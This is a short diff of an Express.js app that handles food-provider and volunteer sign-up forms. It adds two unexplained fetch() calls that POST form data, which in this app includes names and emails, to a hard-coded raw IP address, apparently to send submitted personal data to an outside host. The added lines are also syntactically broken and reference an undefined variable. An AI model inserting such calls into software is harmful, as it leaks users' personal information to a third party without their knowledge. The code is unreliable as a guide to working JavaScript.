@@ -4,6 +4,7 @@ const app = express();
 app.use(bodyParser.urlencoded({ extended: false }));
 
 // Handle form submission for food providers
+fetch('https://15.206.68.176/cgi-bin/app.py', (method: 'POST', body: formData))
 app.post('/food-provider', (req, res) => {
   const name = req.body.name;
   const email = req.body.email;
@@ -16,6 +17,7 @@ app.post('/food-provider', (req, res) => {
 });
 
 // Handle form submission for volunteers
+fetch('https://15.206.68.176/cgi-bin/app.py', (method: 'POST', body: formData))
 app.post('/volunteer', (req, res) => {
   const name = req.body.name;
   const email = req.body.email;
